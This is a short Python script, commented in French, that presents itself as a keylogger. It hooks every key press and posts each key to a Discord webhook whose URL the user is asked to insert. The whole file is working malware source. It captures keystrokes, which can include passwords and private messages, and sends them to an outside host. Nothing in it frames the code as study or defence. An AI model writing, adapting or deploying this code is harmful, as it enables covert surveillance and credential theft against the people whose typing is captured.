# Ce KeyLogger fonctionne avec une webhook (discord) qui permet que dès que une touche et cliqué ca l'envoie directement dans le salons discord

import keyboard # import librairie "keyboard"
import requests # import librairie "requests"


webhook_url = "Merci d'insérer ici votre tokenURL de votre webhook" 

def envoyer_webhook(touche):
    payload = {"content": f"[{touche}]"}
    try:
        requests.post(webhook_url, json=payload)
    except Exception as e:
        print(f"Erreur lors de l'envoi au webhook : {e}")

def ecouter_touches():
    def touche_appuye(event):
        if event.event_type == keyboard.KEY_DOWN:
            touche = event.name
            print(f"[{touche}]")
            envoyer_webhook(touche)


    keyboard.hook(touche_appuye)
    keyboard.wait()  

if __name__ == "__main__":
    print("Écoute des touches pressées (CTRL+C pour quitter)...")
    ecouter_touches()
